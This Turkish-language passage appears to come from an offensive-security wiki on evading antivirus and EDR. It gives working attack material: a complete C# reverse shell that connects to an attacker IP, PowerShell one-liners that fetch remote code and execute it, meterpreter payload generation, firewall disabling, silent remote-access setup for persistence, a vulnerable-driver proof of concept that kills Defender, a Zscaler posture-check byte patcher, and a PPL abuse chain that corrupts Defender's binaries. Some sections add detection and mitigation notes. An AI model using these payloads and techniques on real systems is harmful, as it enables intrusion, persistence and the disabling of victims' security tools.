> 🛈  ConfuserEx, örnekleri otomatik olarak triage etmek için bir IOC olarak kullanılabilecek `ConfusedByAttribute` adlı custom attribute üretir.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Bu projenin amacı, [LLVM](http://www.llvm.org/) derleme paketinin açık kaynaklı bir fork’unu sağlayarak, [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) ve tamper-proofing yoluyla artırılmış yazılım güvenliği sunmaktır.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator, harici bir araç kullanmadan ve compiler’ı değiştirmeden, compile time sırasında obfuscated code üretmek için `C++11/14` dilinin nasıl kullanılacağını gösterir.
- [**obfy**](https://github.com/fritzone/obfy): Uygulamayı crack etmek isteyen kişinin işini biraz daha zorlaştıracak, C++ template metaprogramming framework tarafından üretilen bir katman obfuscated operations ekler.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz, .exe, .dll, .sys dahil olmak üzere çeşitli farklı pe files dosyalarını obfuscate edebilen bir x64 binary obfuscator’dır
- [**metame**](https://github.com/a0rtega/metame): Metame, arbitrary executables için basit bir metamorphic code engine’dir.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator, ROP (return-oriented programming) kullanarak LLVM-supported languages için ince taneli code obfuscation framework’üdür. ROPfuscator, normal instructions’ları ROP chains’e dönüştürerek bir programı assembly code level’ında obfuscate eder ve normal control flow hakkındaki doğal algımızı bozar.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt, Nim ile yazılmış bir .NET PE Crypter’dır
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor, mevcut EXE/DLL’leri shellcode’a dönüştürebilir ve ardından onları yükleyebilir

## SmartScreen & MoTW

İnternetten bazı executables indirip çalıştırdığınızda bu ekranı görmüş olabilirsiniz.

Microsoft Defender SmartScreen, son kullanıcıyı potansiyel olarak malicious uygulamaları çalıştırmaktan korumayı amaçlayan bir security mechanism’dir.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen temel olarak reputation-based bir yaklaşımla çalışır; yani alışılmadık şekilde indirilen uygulamalar SmartScreen’i tetikler, böylece son kullanıcıyı uyarır ve dosyanın çalıştırılmasını engeller (ancak More Info -> Run anyway’e tıklanarak dosya yine de çalıştırılabilir).

**MoTW** (Mark of The Web), internetten indirilen dosyalar oluşturulduğunda URL ile birlikte otomatik olarak yaratılan, Zone.Identifier adlı bir [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>)’dir.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>İnternetten indirilen bir dosya için Zone.Identifier ADS kontrol ediliyor.</p></figcaption></figure>

> [!TIP]
> **trusted** bir signing certificate ile imzalanmış executables’ın **SmartScreen’i tetiklemeyeceğini** not etmek önemlidir.

Payload’larınızın Mark of The Web almasını engellemenin çok etkili bir yolu, onları ISO gibi bir container içine paketlemektir. Bunun nedeni, Mark-of-the-Web (MOTW)’nin **non NTFS** volumes üzerine **uygulanamamasıdır**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) Mark-of-the-Web’den kaçınmak için payload’ları output containers içine paketleyen bir tool’dur.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
SmartScreen'i, yükleri ISO dosyaları içine paketleyerek baypas etmeye yönelik bir demo [PackMyPayload](https://github.com/mgeeky/PackMyPayload/) ile.

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW), Windows'ta uygulamaların ve sistem bileşenlerinin **log events** kaydetmesine izin veren güçlü bir logging mekanizmasıdır. Ancak security products tarafından kötü amaçlı faaliyetleri izlemek ve tespit etmek için de kullanılabilir.

AMSI'nin disabled (bypassed) edilmesine benzer şekilde, kullanıcı alanı process'inin **`EtwEventWrite`** fonksiyonunu da hiçbir event kaydetmeden hemen döndürecek şekilde yapmak mümkündür. Bu, fonksiyonu memory içinde patch'leyip hemen return edecek hale getirerek yapılır; böylece o process için ETW logging etkili biçimde disabled edilir.

Daha fazla bilgi için **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)** adreslerine bakabilirsiniz.


## C# Assembly Reflection

C# binary'lerini memory'de yüklemek uzun zamandır bilinen bir yöntemdir ve AV tarafından yakalanmadan post-exploitation tools çalıştırmak için hâlâ çok iyi bir yoldur.

Payload doğrudan memory'ye yüklenip disk'e dokunmayacağı için, yalnızca tüm process için AMSI patch'leme konusunda endişelenmemiz gerekir.

Çoğu C2 framework'ü (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) C# assemblies'i doğrudan memory içinde execute etme yeteneği sunar, ancak bunu yapmanın farklı yolları vardır:

- **Fork\&Run**

Bu yöntem, **yeni bir sacrificial process başlatmayı**, post-exploitation malicious code'unu bu yeni process'e inject etmeyi, malicious code'u execute etmeyi ve iş bitince yeni process'i kill etmeyi içerir. Bunun hem avantajları hem de dezavantajları vardır. Fork and run yönteminin avantajı, execution'ın bizim Beacon implant process'imizin **dışında** gerçekleşmesidir. Bu, post-exploitation aksiyonumuzda bir şeyler ters giderse veya yakalanırsa, **implant'ımızın hayatta kalma olasılığının çok daha yüksek** olduğu anlamına gelir. Dezavantajı ise **Behavioural Detections** tarafından yakalanma olasılığının **daha yüksek** olmasıdır.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Bu, post-exploitation malicious code'u **kendi process'ine** inject etmekle ilgilidir. Böylece yeni bir process oluşturup AV tarafından scan edilmesinden kaçınabilirsiniz; ancak dezavantajı, payload'unuzun execution'ı sırasında bir şeyler ters giderse **beacon'ınızı kaybetme olasılığınızın çok daha yüksek** olmasıdır, çünkü crash olabilir.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> C# Assembly loading hakkında daha fazla bilgi okumak isterseniz, lütfen şu makaleye göz atın [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) ve onların InlineExecute-Assembly BOF'una ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

C# Assemblies'i **PowerShell'den** de yükleyebilirsiniz; [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) ve [S3cur3th1sSh1t'in videosuna](https://www.youtube.com/watch?v=oe11Q-3Akuk) bakın.

## Using Other Programming Languages

[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) içinde önerildiği gibi, compromised machine'e **Attacker Controlled SMB share üzerinde kurulu interpreter environment'a erişim** vererek diğer diller kullanılarak malicious code execute etmek mümkündür.

Interpreter Binaries ve SMB share üzerindeki environment'a erişim sağlayarak, bu dillerdeki arbitrary code'u compromised machine'in memory'si içinde **execute edebilirsiniz**.

Repo şunu belirtiyor: Defender yine de scripts'i tarıyor; ancak Go, Java, PHP vb. kullanarak **static signatures'ı bypass etmek için daha fazla esnekliğe** sahibiz. Bu dillerde obfuscate edilmemiş random reverse shell scripts ile yapılan testler başarılı olmuştur.

## TokenStomping

Token stomping, bir attacker'ın **access token'ı veya EDR ya da AV gibi bir security prouct'ü manipüle etmesine** izin veren bir tekniktir; böylece privilege'larını düşürerek process'in ölmemesini ama malicious activities'i kontrol etmek için yetkiye sahip olmamasını sağlar.

Bunu önlemek için Windows, security process'lerinin token'ları üzerinde **external processes**'in handle almasını engelleyebilir.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

[**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) içinde açıklandığı gibi, Chrome Remote Desktop'ı bir victim PC'sine kurup sonra onu takeover etmek ve persistence sağlamak oldukça kolaydır:
1. https://remotedesktop.google.com/ adresinden indirin, "Set up via SSH" üzerine tıklayın ve ardından Windows için MSI dosyasını indirmek üzere MSI dosyasına tıklayın.
2. Kurulumu victim üzerinde sessizce çalıştırın (admin required): `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop sayfasına geri dönün ve next'e tıklayın. Ardından sihirbaz sizden authorize etmenizi isteyecek; devam etmek için Authorize butonuna tıklayın.
4. Verilen parametreyi bazı ayarlamalarla çalıştırın: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Pin parametresine dikkat edin; bu, GUI kullanmadan pin ayarlamaya izin verir).


## Advanced Evasion

Evasion çok karmaşık bir konudur; bazen tek bir sistemde birçok farklı telemetry kaynağını hesaba katmanız gerekir, bu yüzden olgun ortamlarda tamamen tespit edilmeden kalmak neredeyse imkansızdır.

Karşı karşıya geldiğiniz her environment'ın kendi güçlü ve zayıf yönleri olacaktır.

Daha ileri Evasion tekniklerine giriş yapmak için @ATTL4S'in [@ATTL4S](https://twitter.com/DaniLJ94) bu konuşmasını izlemenizi şiddetle tavsiye ederim.

{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Aynı zamanda @mariuszbit'in [@mariuszbit](https://twitter.com/mariuszbit) Evasion in Depth hakkındaki diğer harika konuşması da vardır.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck)'i kullanarak binary'nin **hangi parçalarının** Defender tarafından malicious olarak bulunduğunu öğrenene kadar **binary'nin parçalarını kaldırabilir** ve size böldürebilirsiniz.\
Aynı şeyi yapan başka bir tool da [**avred**](https://github.com/dobin/avred)'dir; hizmeti sunan açık bir web sürümü de [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) adresindedir.

### **Telnet Server**

Windows10'a kadar tüm Windows sürümlerinde, (administrator olarak) şu şekilde kurabileceğiniz bir **Telnet server** vardı:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Sistem başlatıldığında **başlasın** ve şimdi **çalıştırın**:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Telnet portunu değiştir** (stealth) ve firewall’u devre dışı bırak:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Şuradan indirin: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (setup değil, bin indirmelerini istiyorsunuz)

**HOST ÜZERİNDE**: _**winvnc.exe**_ çalıştırın ve server'ı yapılandırın:

- _Disable TrayIcon_ seçeneğini etkinleştirin
- _VNC Password_ içinde bir şifre belirleyin
- _View-Only Password_ içinde bir şifre belirleyin

Sonra, binary _**winvnc.exe**_ ve **yeni** oluşturulan _**UltraVNC.ini**_ dosyasını **victim** içine taşıyın

#### **Reverse connection**

**attacker**, **host** üzerinde `vncviewer.exe -listen 5900` binary’sini **çalıştırmalı**; böylece bir reverse **VNC connection** yakalamaya **hazır** olur. Ardından, **victim** içinde: winvnc daemon `winvnc.exe -run` başlatın ve `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` çalıştırın

**UYARI:** Stealth’i korumak için birkaç şey yapmamalısınız

- Eğer zaten çalışıyorsa `winvnc` başlatmayın, yoksa bir [popup](https://i.imgur.com/1SROTTl.png) tetiklersiniz. Çalışıp çalışmadığını `tasklist | findstr winvnc` ile kontrol edin
- Aynı dizinde `UltraVNC.ini` olmadan `winvnc` başlatmayın, yoksa [config window](https://i.imgur.com/rfMQWcf.png) açılır
- Yardım için `winvnc -h` çalıştırmayın, yoksa bir [popup](https://i.imgur.com/oc18wcu.png) tetiklersiniz

### GreatSCT

Şuradan indirin: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
GreatSCT içinde:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Şimdi `msfconsole -r file.rc` ile **lister**’ı başlatın ve **xml payload**’ı şu şekilde **çalıştırın**:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Mevcut defender süreci çok hızlı bir şekilde sonlandıracaktır.**

### Kendi reverse shell’imizi derlemek

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### İlk C# Revershell

Şununla derleyin:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Bunu şununla kullanın:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# using compiler
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Otomatik indirme ve çalıştırma:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscators list: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### build injectors için python kullanma örneği:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Diğer araçlar
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Kernel Space’den AV/EDR Öldürme

Storm-2603, ransomware bırakmadan önce uç nokta korumalarını devre dışı bırakmak için **Antivirus Terminator** olarak bilinen küçük bir konsol aracını kullandı. Araç, kendi **savunmasız ama *imzalı* sürücüsünü** getirir ve bunu, Protected-Process-Light (PPL) AV servislerinin bile engelleyemeyeceği ayrıcalıklı kernel işlemleri yapmak için kötüye kullanır.

Önemli noktalar
1. **İmzalı sürücü**: Diske bırakılan dosya `ServiceMouse.sys`’dir, ancak ikili aslında Antiy Labs’in “System In-Depth Analysis Toolkit” içindeki yasal olarak imzalı `AToolsKrnl64.sys` sürücüsüdür. Sürücü geçerli bir Microsoft imzası taşıdığı için Driver-Signature-Enforcement (DSE) etkin olsa bile yüklenir.
2. **Servis kurulumu**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
İlk satır sürücüyü bir **kernel servisi** olarak kaydeder ve ikinci satır onu başlatır; böylece `\\.\ServiceMouse` user land’den erişilebilir olur.
3. **Sürücü tarafından sunulan IOCTLs**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | PID ile rastgele bir process’i sonlandırır (Defender/EDR servislerini öldürmek için kullanılır) |
| `0x990000D0` | Diskte rastgele bir dosyayı siler |
| `0x990001D0` | Sürücüyü unload eder ve servisi kaldırır |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Neden çalışır**:  BYOVD, user-mode korumalarını tamamen atlar; kernel’de çalışan code, *protected* process’leri açabilir, sonlandırabilir veya PPL/PP, ELAM ya da diğer hardening özelliklerinden bağımsız olarak kernel objelerini manipüle edebilir.

Detection / Mitigation
•  Microsoft’un vulnerable-driver block list’ini (`HVCI`, `Smart App Control`) etkinleştirin; böylece Windows `AToolsKrnl64.sys` yüklemeyi reddeder.
•  Yeni *kernel* servislerinin oluşturulmasını izleyin ve bir driver world-writable bir dizinden yüklenirse ya da allow-list’te yoksa alarm üretin.
•  Özel device object’lere yönelik user-mode handle’larını ve ardından gelen şüpheli `DeviceIoControl` çağrılarını takip edin.

### On-Disk Binary Patching ile Zscaler Client Connector Posture Checks’i Bypass Etme

Zscaler’ın **Client Connector** bileşeni device-posture kurallarını lokal olarak uygular ve sonuçları diğer bileşenlere iletmek için Windows RPC’ye güvenir. İki zayıf tasarım tercihi, tam bir bypass’ı mümkün kılar:

1. Posture değerlendirmesi **tamamen client-side** gerçekleşir (server’a bir boolean gönderilir).
2. Dahili RPC endpoint’leri yalnızca bağlanan executable’ın **Zscaler tarafından imzalı** olduğunu doğrular (`WinVerifyTrust` ile).

Diskteki dört imzalı binary’yi **patch’leyerek** her iki mekanizma da etkisiz hale getirilebilir:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Her zaman `1` döner; böylece her check uyumlu görünür |
| `ZSAService.exe` | `WinVerifyTrust`’e dolaylı çağrı | NOP-ed ⇒ herhangi bir (hatta imzasız) process RPC pipes’a bağlanabilir |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret` ile değiştirildi |
| `ZSATunnel.exe` | Tünel üzerindeki bütünlük kontrolleri | Short-circuited |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Orijinal dosyalar değiştirildikten ve service stack yeniden başlatıldıktan sonra:

* **Tüm** posture checks **yeşil/uyumlu** olarak görünür.
* İmzalanmamış veya değiştirilmiş binary'ler named-pipe RPC endpoint'lerini açabilir (ör. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Ele geçirilmiş host, Zscaler policies tarafından tanımlanan internal network'e sınırsız erişim kazanır.

Bu case study, tamamen client-side trust decisions ve basit signature checks'in birkaç byte patch ile nasıl etkisiz hale getirilebildiğini gösterir.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL), yalnızca eşit veya daha yüksek korumalı process'lerin birbirini tamper etmesine izin veren bir signer/level hierarchy uygular. Offensively, eğer yasal olarak bir PPL-enabled binary başlatabiliyor ve argümanlarını kontrol edebiliyorsanız, benign functionality'yi (ör. logging) AV/EDR tarafından kullanılan protected directories'e karşı constrained, PPL-backed write primitive'e dönüştürebilirsiniz.

Bir process'in PPL olarak çalışmasını sağlayan şey
- Target EXE (ve yüklenen herhangi bir DLL) PPL-capable bir EKU ile imzalanmış olmalıdır.
- Process, CreateProcess ile şu flags kullanılarak oluşturulmalıdır: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Binary'nin signer'ı ile eşleşen uyumlu bir protection level istenmelidir (ör. anti-malware signer'lar için `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`, Windows signer'lar için `PROTECTION_LEVEL_WINDOWS`). Yanlış seviyeler oluşturma aşamasında başarısız olur.

PP/PPL ve LSASS protection'a daha geniş bir giriş için ayrıca şuna bakın:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (protection level seçer ve arguments'i target EXE'ye iletir):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Kullanım kalıbı:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- İmzalı sistem binary `C:\Windows\System32\ClipUp.exe` kendini spawn eder ve çağıranın belirttiği bir path’e log dosyası yazmak için bir parameter kabul eder.
- PPL process olarak başlatıldığında, file write PPL backing ile gerçekleşir.
- ClipUp, içinde spaces bulunan path’leri parse edemez; normalde protected location’lara işaret etmek için 8.3 short paths kullanın.

8.3 short path helpers
- Short names listele: her parent directory içinde `dir /x`.
- cmd içinde short path türet: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) PPL-capable LOLBIN’i (ClipUp) bir launcher (ör. CreateProcessAsPPL) ile `CREATE_PROTECTED_PROCESS` kullanarak başlatın.
2) ClipUp log-path argument’ını geçirerek protected bir AV directory içinde dosya creation’ı zorlayın (ör. Defender Platform). Gerekirse 8.3 short names kullanın.
3) Target binary, çalışırken AV tarafından normalde açık/locked durumdaysa (ör. MsMpEng.exe), AV başlamadan önce boot sırasında yazmayı planlayın; bunun için daha erken güvenilir şekilde çalışan bir auto-start service kurun. Boot ordering’i Process Monitor (boot logging) ile doğrulayın.
4) Reboot sonrası PPL-backed write, AV kendi binaries’ini lock’lamadan önce gerçekleşir; target file corrupt olur ve startup engellenir.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notlar ve kısıtlamalar
- ClipUp’un ne yazacağını yerleşim dışında kontrol edemezsiniz; bu primitive, hassas içerik enjeksiyonundan ziyade corruption için uygundur.
- Bir service kurmak/başlatmak için local admin/SYSTEM ve bir reboot penceresi gerekir.
- Zamanlama kritiktir: hedef açık olmamalıdır; boot-time execution file lock’ları önler.

Tespitler
- `ClipUp.exe` için olağandışı argümanlarla process creation, özellikle standart olmayan launcher’lar tarafından parented edilmişse, boot civarında.
- Auto-start olarak yapılandırılmış yeni services ve Defender/AV’den sürekli önce başlayan şüpheli binaries. Defender başlangıç hatalarından önce yapılan service creation/modification işlemlerini inceleyin.
- Defender binary’leri/Platform dizinlerinde file integrity monitoring; protected-process flags olan süreçler tarafından yapılan beklenmedik file creation/modification işlemleri.
- ETW/EDR telemetry: `CREATE_PROTECTED_PROCESS` ile oluşturulan süreçleri ve AV dışı binary’ler tarafından anomal PPL level kullanımını arayın.

Azaltmalar
- WDAC/Code Integrity: hangi signed binaries’nin PPL olarak ve hangi parent’lar altında çalışabileceğini kısıtlayın; meşru bağlamlar dışında ClipUp invocation’ını engelleyin.
- Service hygiene: auto-start services oluşturulmasını/değiştirilmesini kısıtlayın ve start-order manipulation’ı izleyin.
- Defender tamper protection ve early-launch protections etkin olsun; binary corruption gösteren startup hatalarını inceleyin.
- Ortamınızla uyumluysa, security tooling barındıran volumes üzerinde 8.3 short-name generation’ı devre dışı bırakmayı düşünün (iyice test edin).

PPL ve tooling için referanslar
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
